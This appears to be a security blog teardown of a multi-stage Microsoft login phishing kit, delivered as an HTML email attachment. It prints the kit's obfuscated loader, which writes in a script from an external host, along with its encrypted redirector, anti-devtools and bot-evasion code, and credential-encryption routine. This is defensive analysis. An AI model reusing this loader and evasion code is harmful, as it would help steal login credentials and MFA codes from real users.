---
title: "[teardown] microsoft login phishing site"
date: 2024-12-18T00:00:00+00:00
draft: false
---

Hey space travelers 🚀

Today we'll be doing a teardown of a microsoft login phishing site.

The origin of this scam was an email: [edcb7cd22eb3cf1f5879b9d847d809bf](https://app.any.run/tasks/dcc3ee7c-7d0f-4b79-aec2-c45057c49ba4)

## First Contact (Script Loader)

After base64 decoding the email body we see a small obfuscated payload:

{{< highlight html >}}
<html><head><meta charset="UTF-8"></head><body><script>butterbur = '#Y3VzdG9tb3JkZXJzQGJpb2xlZ2VuZC5jb20=';

new Function(
  (() => {
    let dgRF = '68617774686f726e203d206068747470733a2f602b272f7061272b2274657262726f222b277468272b276572272b27732e636f272b606d2f7265733434602b27342e7068272b27703f322d36383734272b603734373037333361602b2732663266272b603434333734602b6064326536623633602b2737613633272b603739366337602b22363661373536222b273237272b2735326537272b273237272b2235326637383461222b27343536663632272b223333353632222b27662d627574272b22746572222b22627572223b0a646f63756d656e745b277772697465275d28223c736372697074207372633d2722202b2068617774686f726e202b2022273e3c5c2f7363726970743e22293b';
    let fNux = '';
    for (let UDJh = 0; UDJh < dgRF.length; UDJh += 2) {
      fNux += String.fromCharCode(parseInt(dgRF.substr(UDJh, 2), 16));
    }
    return fNux;
  })()
)();</script></body></html>
{{< /highlight >}}

<br>

By excluding the enclosing [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) we can have the payload deobfuscate itself trivially.

![payload 1](/img/microsoft-phish/payload-1.png)

Similarly evaluating the `hawthorn` variable in the deobfuscated content yields the URL for a second payload.

```
hxxps [:] // paterbrothers [.] com / res444 [.] php?2-68747470733a2f2f44374d2e6b637a63796c766a7562752e72752f784a456f6233562f-butterbur
```
<br>

#### 🔔 Interesting Tidbit 1

With only a very narrow slice of dated email clients supporting javascript, the authors of this scam
opted to include this html payload as an attachment:

```
Content-Disposition: attachment;
 filename=vRecord__0064secs__biolegend.com.html
```

In doing so they rely on coercing the victim to download the HTML page and leveraging their unsandboxed browser
to execute their payload.


## Second Stage (Configurable Redirector)

{{< highlight javascript >}}
var gFdMKmYbhptSZZqq = document.createElement("script");
gFdMKmYbhptSZZqq.setAttribute("src","https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js");
document.head.append(gFdMKmYbhptSZZqq);
gFdMKmYbhptSZZqq.onload=function(){
var {a,b,c,d} = JSON.parse(atob("eyJhIjoiK25GRGx1QnpDVXNsOU5GdDRrV3lzc2pCZHp5UlhEaFhHRExMZTQySld6bENadzlaWlE5QUc1d3Nad3RsM3BLd2hsSUJDNGNQdU1nTkxvdUUzY3daNXdhbERKT0c0M1oyRGZwVzk3WTkxK2JSVlFtMDYzcnUySkNQYkoxaXc4akxpQjZQbFNhNHZmdjVxQmlWUXFIQlREQXBWUlwvMm9CTHEzdHh3dDZwMDZLWGpJQmRoSlI4dUoxK3hua2grQkNNZUF5TmR4NUFtSmxzMHdGUnFuS0NIVlBPMU8wcUYzVlhxVThBXC9Yb2hxdFlZYUlid0pMSk5WQnE2bTNJRVk3dHVkWWFreU1WMjNXUlhCck5cL1hZaDZyYXI3ZytOTnZjMXhIXC9PUWVmaXM0WTNaOTlra2dkcDdNcmJXUkZFWUUzV244ZTlMdVwvXC96T0lyNitCTUk4bW4rcWtDbld6ZkJOa0owRW5Rdyt1cUppSktmUVQrclBjaWlDNW9wY1VsbVpLZWRETlBQQTkxYTNDUm5HOWMyWm84V2ZxN3BtQWFCcHI2Q09SeDdZSzNwRWR6amhoejV3SFFvYnBwNGd3K1Zsa2NMTGxWUDdzbHdDWTc4cnRtR1lJeHhpWHF5Y3NwRTVNVStIK0g4Uk1UeWZFWlBUSTZIcThHNDNNellPYkpGc0VyV3F4ZkR1ZWw3R2NiczJybkJSVHl0dW1XT0JqbHR0T1ZcL01hTXl4Q3ZsWmd6bVJWNmg3ZTdNOUR4U09LQlR0MEY5ZTI0SU5Tb1wvVW1iYkZlTVJwa1ZKTnIwRzUxU1RVOXN5cm5LYnhEXC9TMzFPWkE3TG40WllzT3d2ZG8rZ2xtdWpYOUZFWUdOajNCWHpkaTVEOWMyMTc3RjRPckZobVlDMGx3MFh2N1Q0NGRvVmdaVUxLOGRWcWs0UWJyNTVVdG9CWUNybVo3Um9nR21tWTVxeE5JOWJwVjRwa2xMR2RzR3NyZUswR2p5YU9UeUpoTzhDWVwvRUhtWnpoaTkyQ3VXVWV0WktJdmZqb0lNMTRCVnlhRjJGeUFRMUlEdXA2eDNUWHJNMGQzRUxaU05Pd1U9IiwiYiI6IjlmM2ZkNjc3ZjExMjI1NDEyYmUzZjA1NjBkZGY2Njk4IiwiYyI6IjgyYzViMjFjYzA4OWFmOTc0YWNmYTVjNDlhNDhkNDgxIiwiZCI6IjY2NjU2MzM0NjMzOTM4NjI2NTMyMzQzMTY2MzkzNzY2NjYzNTMyNjQzNTMwMzUzNDMxMzczMDYzMzQ2MzM5NjEifQ=="));
var UaeZamNKbTTNAHOx = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d),CryptoJS.enc.Hex.parse(b),{hasher:CryptoJS.algo.SHA512,keySize:64/8,iterations:999});
cdYLsDesdEtOfNIM = CryptoJS.AES.decrypt(a,UaeZamNKbTTNAHOx,{iv:CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
cdYLsDesdEtOfNIM = cdYLsDesdEtOfNIM.replace(/xXSblvvsoUxUvLep/g, butterbur);
document.write(cdYLsDesdEtOfNIM);
}
{{< /highlight >}}
<br/>

We see an AES encrypted payload that can be decrypted trivially by redirecting the output intended for `document.write`.

Note that this payload references a variable defined in the first stage, preventing it from executing in isolation: `butterbur = '#Y3VzdG9tb3JkZXJzQGJpb2xlZ2VuZC5jb20=';`

<br>

![payload 2](/img/microsoft-phish/payload-2.png)

By assigning the output of the payload to `document.body.innerText` we prevent it from being executed as active content, and can analyze it further. The decrypted payload creates a self-navigated anchor element pointed at a third payload.

```
hxxps [:] // D7M [.] kczcylvjubu [.] ru / xJEob3V#rjJLEHyjwqHxuYSp
```

#### 🔔 Interesting Tidbit 2

In the URL hosting the stage 2 payload we can discover some functionality of the target script by parameter tampering: `2-68747470733a2f2f44374d2e6b637a63796c766a7562752e72752f784a456f6233562f-butterbur`

The query parameter appears to to take the format:

`<deploy technique>-<entropy/id>-<stage 1 variable name>`

Attempting ascending numbers for deploy technique reveals:

- **1**: Deploy stage 3 from an embedded `IFRAME`
- **2**: Deploy stage 3 using a self-navigating anchor
- **3**: Deploy stage 3 by HTTP redirecting directly

### Third Stage (Anti-Analysis)

The third payload delivered in this scam is a malformed HTML document peppered with motivational quotes
and obfuscated javascript payloads. 

![payload 3](/img/microsoft-phish/payload-3.png)

The obfuscation can be removed using a little automation 🐍

{{< highlight python >}}
import base64
import requests
import re

# Don't reveal this is automation to target
headers = {'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
r = requests.get("https://d7m.kczcylvjubu.ru/xJEob3V/", headers=headers)
deob = re.sub(r'''atob\(["'](.*?)["']\)''', lambda m: f'`{base64.b64decode(m.group(1)).decode()}`', r.text, flags=re.DOTALL)
print(deob)
{{< /highlight >}}

Immediately we see a couple techniques to throw off automated scanners and prying eyes. 

1. Trigger [CloudFlare Turnstile](https://www.cloudflare.com/application-services/products/turnstile/)

{{< highlight html >}}
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
{{< /highlight >}}

2. Blackhole webdrivers/phantomJS/burp by sniffing globals and useragents

{{< highlight javascript >}}
if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.includes("Burp")) {
        window.location = "about:blank";
{{< /highlight >}}

3. Disable right click context menus

{{< highlight javascript >}}
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    return false;
});
{{< /highlight >}}

4. Blackhole browser devtools

{{< highlight javascript >}}
fyJVHjYoFM = false;
(function KUxEyWOQwa() {
    let GcqbXrgCOb = false;
    const SpCRWhEShJ = 100;
    setInterval(function() {
        const jHfsdysllK = performance.now();
        debugger;
        const bZGxFTdWSu = performance.now();
        if (bZGxFTdWSu - jHfsdysllK > SpCRWhEShJ && !GcqbXrgCOb) {
            fyJVHjYoFM = true;
            GcqbXrgCOb = true;
            window.location.replace('https://www.outlook.com');
        }
    }, 100);
})();
{{< /highlight >}}

If this isn't a technique you've seen before: its an anti-devtools method that relied on rapidly 
invoking the `debugger;` builtin to stop execution when devtools are open. Before and after the 
manual breakpoint is triggered a timer is recorded. If a significant enough time has elapsed the 
payload knows its being inspected and it blackholes the client.

Disabling breakpoints is sufficient to bypass this check.

Passing all of these guards leads us to the meat of the phish, the payload now negotiates with the
server to generate a single use session used to phish a microsoft login.

```
hxxps [:] // d7m [.] kczcylvjubu [.] ru / OJPCFBWMLNOOUZRVYVUHTRIPJ6WVDQNKDO?769299870200133h7j7msm09i86lv
```

## Stage 4 (Go Phish)

![phish](/img/microsoft-phish/phish.png)

I found a direct path to the most interesting parts of the final payload by observing the network traffic and 
inspecting invokers at each layer of the callstack. 

The payload takes the username and password of user and attempts to validate it. The username and password are
encrypted before sending to the attackers. 

![phish](/img/microsoft-phish/network.png)

In examining the callstacks for the network requests we're greeting with a new heavier layer of obfuscation (truncated for brevity):

{{< highlight javascript >}}
const _0x21c50a=_0x1534;(function(_0x381381,_0x47d76d){const _0x94f40=_0x1534,_0x3a1ac3=_0x381381();while(!![]){try{const _0x30cc6a=parseInt(_0x94f40(0x2ee))/0x1+-parseInt(_0x94f40(0x2d3))/0x2+-parseInt(_0x94f40(0x1d2))/0x3+parseInt(_0x9...
{{< /highlight >}}


The obfuscation consists of variable name obfuscation and a strings table. A strategy for recovering the strings table can be determined trivially by dynamically analyzing its lookup behavior.

![phish](/img/microsoft-phish/strings-arr.png)

The string lookup method appears to be a simple index lookup with a fixed offset.

We can deobfuscate well enough to analyze this payload by reconstructing strings and running the result through prettier.


{{< highlight python >}}
import ast
import re


with open('ob.js', 'r') as f:
    js = f.read()

# Recover strings table
strings = re.search(r"""_0x3965ac = \[(.*?)\];""", js, re.DOTALL)
strings = ast.literal_eval(f'[{strings.group(1)}]')

# Find all string lookup methods
lookups = {'_0x21c50a'}
while True:
    n = len(lookups)
    for lookup_m in list(lookups):
        for m in re.finditer(f'const (\\S+) = {lookup_m};', js, re.DOTALL):
            lookups.add(m.group(1))
    if len(lookups) == n:
        break

# Recover all strings
for lookup_m in lookups:
    for m in re.finditer(f'{lookup_m}\\(0x([0-9a-f]+)\\)', js, re.DOTALL):
        s = strings[int(m.group(1), 16) - 458]
        js = js.replace(m.group(0), f'`{s}`')

print(js)
{{< /highlight >}}

Note that function names remained intact even after obfuscation, this is helpful for understanding the capabilities of this phishing attack.

![phish](/img/microsoft-phish/deob.png)


#### Capabilities

- The attackers have the ability to proxy the authorization real-time and prompt for multiple methods of 2fa
- The number of supported authentication mechanisms is impressive, covering adfs and okta SSO
  - The attackers handle failure cases well, proxying real failure information to users
- Authentication data passed by the users is AES encrypted using a hardcoded key

{{< highlight python >}}
function encryptData(data) {
    const key = CryptoJS.enc.Utf8.parse('1234567890123456');
    const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
    const encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7,
        mode: CryptoJS.mode.CBC
    });
    return encrypted.toString();
}
{{< /highlight >}}

#### 🔔 Interesting Tidbit 3

The phishing site collects analytics on visitors, giving them insights on the success of their campaign.

```
pagelink=xZ9Ql7IeWFjvauzuO8TlUw%3D%3D&mailtype=0&type=3&typeval=0&ip=91.239.6.182&country=Albania&useragent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A133.0)+Gecko%2F20100101+Firefox%2F133.0&appnum=1
```

<br>

Hope you enjoyed peeking under the hood of a phishing framework, till next time! 🎉